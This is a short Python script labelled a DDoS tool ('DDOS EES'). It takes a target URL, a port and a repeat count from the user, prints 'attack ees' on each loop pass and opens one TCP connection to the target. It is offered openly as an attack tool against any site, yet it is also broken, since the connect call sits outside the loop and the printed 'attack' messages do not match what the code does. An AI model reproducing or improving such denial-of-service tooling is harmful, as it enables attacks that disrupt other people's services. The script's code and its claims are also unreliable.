import socket
import sys
import os
try:
    os.system ("clear")
    os.system ("figlet DDOS EES")
    print ("""
http://www.google.com [×]
(www.google.com) × https - http
CY : developer sayser EES
    """)
except:
       os.system("pkg install figlet")
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error as err:
    print ("ERROR %s" %(err))
    exit()

url=input("url => ")
port=int(input("port => "))
nam=int(input("nam => "))
for i in range(nam):
    ip = socket.gethostbyname(url)
    print ("attack ees",i)
s.connect((ip, port))
